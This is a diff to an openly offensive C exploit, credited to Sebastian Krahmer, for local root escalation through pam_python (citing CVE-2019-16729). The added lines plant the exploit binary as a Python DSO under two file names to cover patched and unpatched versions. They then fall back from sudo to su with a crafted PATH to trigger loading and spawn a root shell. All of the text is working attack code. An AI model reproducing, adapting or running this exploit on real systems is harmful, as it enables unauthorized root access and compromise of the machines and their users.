@@ -1,6 +1,7 @@
 /* Trivial pam_python boomsh. (C) Sebastian Krahmer
  *
- * Not widely used anyway. Using sudo vector.
+ * Not widely used anyway. Using sudo vector if sudo is found
+ * and su otherwise.
  * Needs to change if different service is using pam_python.
  * You ain't put scripts in critical places, except for playing.
  *
@@ -112,13 +113,28 @@ int main()
 	printf("[+] Done.\n");
 
 	printf("[*] Setting up DSO ...\n");
+
+	// < pam_python 1.0.7 (CVE-2019-16729)
 	cp("/proc/self/exe", "lib/python2.7/site.so");
+
+	// >= pam_python 1.0.7 (no CVE)
+	cp("/proc/self/exe", "lib/python2.7/encodings.so");
+
 	printf("[+] Done.\n");
 
 	printf("[?] Here comes the pain. #nojailforshellz\n");
 
 	char *sudo[] = {"/usr/bin/sudo", "bash", NULL};
-	execve(*sudo, sudo, NULL);
+	char *su[] = {"/bin/su", NULL};
+	char *env[] = {"PATH=/xxx", NULL};
+
+	struct stat st;
+
+	if (stat(*sudo, &st) == 0)
+		execve(*sudo, sudo, env);
+	else
+		execve(*su, su, env);
+
 	return -1;
 }
 
